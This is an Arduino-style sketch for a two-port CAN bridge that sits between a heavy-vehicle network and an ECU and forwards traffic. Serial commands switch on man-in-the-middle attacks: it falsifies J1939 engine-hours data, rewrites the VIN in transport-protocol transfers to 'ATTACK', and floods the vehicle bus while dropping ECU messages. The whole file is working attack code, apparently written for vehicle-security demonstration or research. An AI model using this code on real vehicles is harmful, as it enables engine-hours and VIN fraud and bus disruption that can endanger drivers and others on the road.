#include <FlexCAN_T4.h>

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_1024> vehicle_can;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_1024> ecu_can;

#define RED_LED    3
#define GREEN_LED  2
#define YELLOW_LED 4
#define AMBER_LED  5 

boolean RED_LED_state;
boolean GREEN_LED_state;
boolean YELLOW_LED_state;
boolean AMBER_LED_state;

boolean engine_hours_attack_state;
boolean transport_message_attack_state;
boolean vin_attack_state;
boolean flood_attack_state;

uint32_t vehicle_rx_count;
uint32_t ecu_rx_count;

CAN_message_t flood_msg;

void setup() {

  // put your setup code here, to run once:
  pinMode(RED_LED,OUTPUT);
  pinMode(GREEN_LED,OUTPUT);
  pinMode(YELLOW_LED,OUTPUT);
  pinMode(AMBER_LED,OUTPUT);
  pinMode(LED_BUILTIN,OUTPUT);
  RED_LED_state = true;
  GREEN_LED_state = true;
  YELLOW_LED_state = true;
  AMBER_LED_state = true;

  vehicle_can.begin();
  vehicle_can.setBaudRate(250000);
  vehicle_can.setMaxMB(32);
  
  
  ecu_can.begin();
  ecu_can.setBaudRate(250000);
  ecu_can.setMaxMB(32);
   
  vehicle_can.enableFIFO();
  vehicle_can.enableFIFOInterrupt();
  vehicle_can.onReceive(rx_vehicle_msg);
  
  ecu_can.enableFIFO();
  ecu_can.enableFIFOInterrupt();
  ecu_can.onReceive(rx_ecu_can);
}

void rx_vehicle_msg(const CAN_message_t &msg){
  vehicle_rx_count++;
  AMBER_LED_state = !AMBER_LED_state;
  
  ecu_can.write(msg);
}

void rx_ecu_can(CAN_message_t &msg){
  if (engine_hours_attack_state){
    if (msg.id == 0x18FEE500){// Engine hours from engine #1
      Serial.println("Changing Message for Hours.");
      msg.buf[0]=0xAA;
      msg.buf[1]=0xAA;
      msg.buf[2]=0xAA;
      msg.buf[3]=0xAA;
    }
  }
  if (vin_attack_state){
    if ((msg.id & 0x00FFFFFF) == 0x00ECFF00){
      Serial.println("Found Transport Protocol Connection Management Message.");
      if (msg.buf[6] == 0xFE && msg.buf[5] == 0xEC){
        Serial.println("Found VIN Transport Setup Message.");
        transport_message_attack_state = true;
        vin_attack_state = false;
      }
    }
  }
  if (transport_message_attack_state){
    if ((msg.id & 0x00FFFFFF) == 0x00EBFF00){// TP.DT messages
      Serial.println("Found Transport Protocol Data Transfer Message.");
      // Convert all in messages to an 
      msg.buf[1]='A'; //0x61
      msg.buf[2]='T'; //0x74
      msg.buf[3]='T'; //0x74
      msg.buf[4]='A';
      msg.buf[5]='C';
      msg.buf[6]='K';
      msg.buf[7]=' ';
      transport_message_attack_state = false;
    }
    
   
  }
  ecu_rx_count++;
  YELLOW_LED_state = !YELLOW_LED_state;
  if (!flood_attack_state) vehicle_can.write(msg);
}

void loop() {
  vehicle_can.events();
  ecu_can.events();

  if (flood_attack_state) vehicle_can.write(flood_msg);
  
  if (Serial.available()){
    char c = Serial.read();
    while(Serial.read() > 0); //flush the read buffer
    // If the character matches, toggle the attack.
    if      (c == 'h') engine_hours_attack_state = !engine_hours_attack_state;
    else if (c == 't') transport_message_attack_state = !transport_message_attack_state;
    else if (c == 'v') vin_attack_state = !vin_attack_state;
    else if (c == 'f') flood_attack_state = !flood_attack_state;
    Serial.println(c);
  }
  RED_LED_state = (transport_message_attack_state ||
                   engine_hours_attack_state ||
                   vin_attack_state || 
                   flood_attack_state);
  
  digitalWrite(RED_LED,RED_LED_state);
  digitalWrite(GREEN_LED,GREEN_LED_state);
  digitalWrite(YELLOW_LED,YELLOW_LED_state);
  digitalWrite(AMBER_LED,AMBER_LED_state);
}
